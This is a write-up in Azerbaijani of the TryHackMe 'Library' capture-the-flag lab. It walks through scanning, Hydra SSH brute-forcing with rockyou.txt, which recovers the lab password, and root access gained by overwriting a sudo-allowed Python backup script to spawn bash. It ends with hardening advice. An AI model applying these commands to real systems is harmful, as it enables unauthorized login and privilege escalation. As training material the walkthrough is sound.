# 📚 TryHackMe — Library CTF Writeup (Azərbaycanca)

> **Çətinlik:** Başlanğıc (Easy)  
> **Vaxt:** ~45 dəqiqə  
> **Hədəf:** user.txt və root.txt flaglarını tapmaq  
> **Texnologiya:** HTTP, SSH, Hydra, Python Script Hijacking

---

## 📋 Ümumi Məlumat

Bu CTF-də hədəf maşında HTTP və SSH servisləri işləyir. Məqsədimiz:
1. Açıq portları tapmaq
2. Web saytda istifadəçi adını aşkara çıxarmaq
3. `robots.txt` faylından ipucu götürmək
4. Hydra ilə SSH şifrəsini sındırmaq
5. `user.txt` flagını götürmək
6. Python skript hijacking ilə root-a qalxmaq
7. `root.txt` flagını götürmək

---

## Addım 1 — Port Skanlaması (Nmap)

```bash
nmap -sC -sV <TARGET_IP> -T4 -oN Initial
```

**Nmap parametrlərinin izahı:**

| Parametr | Mənası |
|----------|--------|
| `-sC` | Default skriptlər işlətsin |
| `-sV` | Servis versiyasını aşkarlasın |
| `-T4` | Sürətli skan rejimi |
| `-oN Initial` | Nəticəni `Initial` faylına yazsın |

**Nəticə:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

İki port açıqdır:

| Port | Servis |
|------|--------|
| 22   | SSH |
| 80   | HTTP (Web server) |

---

## Addım 2 — Web Saytını Analiz Etmək

Brauzerdə `http://<TARGET_IP>` açırıq. İlk baxışda saytda maraqlı bir şey görünmür — standart web səhifəsidir.

Amma saytın məzmununu diqqətlə oxuyanda bir **istifadəçi adı** tapırıq:

```
meliodas
```

> **Vacib ipucu:** CTF-lərdə web saytın bütün mətnini oxumaq lazımdır — çox vaxt istifadəçi adları, versiya məlumatları və ya kommentlər gizlənir.

---

## Addım 3 — Gobuster ilə Gizli Qovluqlar

```bash
gobuster dir -u http://<TARGET_IP>:80 -w /usr/share/wordlists/dirb/common.txt
```

**Tapılan əsas fayl:**

```
/robots.txt
```

### robots.txt nədir?

`robots.txt` faylı axtarış motorlarına hansı səhifələrə girməməyi söyləyir. Lakin CTF-lərdə bu fayl tez-tez gizli ipucları saxlayır.

`http://<TARGET_IP>/robots.txt` açırıq:

```
User-agent: *
Disallow: /
rockyou
```

**İpucu tapıldı: `rockyou`** — bu bizə `rockyou.txt` wordlistini işlətməyi söyləyir!

---

## Addım 4 — Hydra ilə SSH Şifrə Sındırma

İndi bizdə var:
- **İstifadəçi adı:** `meliodas`
- **Wordlist ipucu:** `rockyou.txt`

Hydra ilə SSH üzərindən brute-force hücumu edirik:

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

**Parametrlərin izahı:**

| Parametr | Mənası |
|----------|--------|
| `-l meliodas` | İstifadəçi adı (tək — kiçik L) |
| `-P rockyou.txt` | Şifrə siyahısı (böyük P) |
| `ssh://<IP>` | Hədəf protokol və IP |

**Nəticə:**

```
[22][ssh] host: <TARGET_IP>   login: meliodas   password: iloveyou1
```

✅ **Şifrə tapıldı: `iloveyou1`**

> **Hydra nədir?** Şəbəkə xidmətlərinə qarşı brute-force hücumu aparan alətdir. SSH, FTP, HTTP və digər protokolları dəstəkləyir.

---

## Addım 5 — SSH ilə Sisteme Giriş

```bash
ssh meliodas@<TARGET_IP>
```

```
Password: iloveyou1
```

✅ **Sistemə daxil olduq!**

Faylları yoxlayırıq:

```bash
ls -la
```

```
-rw-r--r-- 1 root      root       33 Dec 24  2019 user.txt
-rw-r--r-- 1 root      root      424 Dec 14  2019 bak.py
```

---

## Addım 6 — User Flagını Götürmək

```bash
cat user.txt
```

🏁 **User flag tapıldı!**

---

## Addım 7 — Privilege Escalation (Root-a Qalxmaq)

### 7.1 — bak.py faylını yoxlayaq

```bash
cat bak.py
```

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

Bu skript `/var/www/html` qovluğunu zip arxivinə salır — backup skriptidir.

Skripti birbaşa işlətməyə çalışırıq:

```bash
python bak.py
```

```
Permission denied
```

İcazəmiz yoxdur. Sudo-nu yoxlayaq.

### 7.2 — Sudo İcazələrini Yoxlamaq

```bash
sudo -l
```

**Nəticə:**

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python /home/meliodas/bak.py
```

`meliodas` istifadəçisi `bak.py` skriptini **root kimi şifrəsiz** işlədə bilir!

### 7.3 — Python Script Hijacking

Fikir belədir: `bak.py` faylının **içini dəyişdirib** root shell açan kod yazırıq. Sonra onu `sudo` ilə işlədirik → root shell alırıq!

**bak.py faylını dəyişdiririk:**

```bash
echo 'import os; os.system("/bin/bash")' > /home/meliodas/bak.py
```

**Nə etdik?**
- `echo` — mətn yazar
- `>` — faylın üzərinə yazır (köhnə məzmunu silir)
- `import os; os.system("/bin/bash")` — Python kodu: bash shell açır

**İndi root kimi işlədirik:**

```bash
sudo /usr/bin/python /home/meliodas/bak.py
```

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

✅ **Root oldunuq!**

---

## Addım 8 — Root Flagını Götürmək

```bash
cat /root/root.txt
```

🏆 **Root flag tapıldı! CTF tamamlandı!**

---

## 🔍 Hücum Axışı — Xülasə

```
Nmap skanı
    ↓
Port 80 (HTTP) — web saytda "meliodas" istifadəçi adı tapılır
    ↓
robots.txt — "rockyou" ipucu tapılır
    ↓
Hydra brute-force → SSH şifrəsi: iloveyou1
    ↓
SSH girişi → user.txt flag
    ↓
sudo -l → bak.py root kimi işləyə bilir
    ↓
bak.py-ni dəyişdiririk → /bin/bash kodu yazırıq
    ↓
sudo python bak.py → ROOT SHELL → root.txt flag
```

---

## 🔍 İstifadə Olunan Zəifliklər

| Zəiflik | Açıqlama | Şiddət |
|---------|----------|--------|
| İstifadəçi adının web-də açıq olması | `meliodas` adı saytda görünürdü | 🟡 Orta |
| robots.txt-də wordlist ipucu | Hücumçuya istiqamət verdi | 🟡 Orta |
| Zəif SSH şifrəsi | `iloveyou1` rockyou-da var | 🔴 Kritik |
| Sudo Python Script Hijacking | `bak.py` root kimi işlədilir, amma fayla yazma icazəsi var | 🔴 Kritik |

---

## 🛡️ Tövsiyələr

1. **İstifadəçi adlarını web-də açıqlamayın** — Saytda admin/istifadəçi adları göstərilməməlidir.
2. **robots.txt-də həssas məlumat saxlamayın** — Bu fayl hamıya açıqdır.
3. **Güclü şifrə istifadə edin** — `iloveyou1` ən çox istifadə olunan şifrələrdən biridir.
4. **Sudo siyasətini düzgün konfiqurasiya edin** — İstifadəçiyə yazma icazəsi olan faylı sudo ilə icra etdirməyin. Ya faylı root-a məxsus edin, ya da sudo icazəsini ləğv edin.
5. **Minimum hüquq prinsipi** — İstifadəçilərə yalnız lazımi qədər icazə verin.

---

## 🧰 İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port skanlaması |
| `gobuster` | Web qovluq/fayl taraması |
| `hydra` | SSH brute-force |
| `ssh` | Uzaq sisteme giriş |
| `echo` + Python | Script hijacking |

---

## 📖 Bu CTF-dən Öyrənilənlər

- Web saytları diqqətlə oxumaq — gizli məlumatlar tapa bilərsiniz
- `robots.txt` faylı həmişə yoxlanmalıdır
- Hydra ilə SSH brute-force hücumu
- `sudo -l` — privilege escalation üçün ilk yoxlanacaq komanda
- Python script hijacking texnikası

---

*Bu writeup yalnız təhsil məqsədilə hazırlanmışdır. Hər zaman icazəli sistemlərə qarşı test edin.*
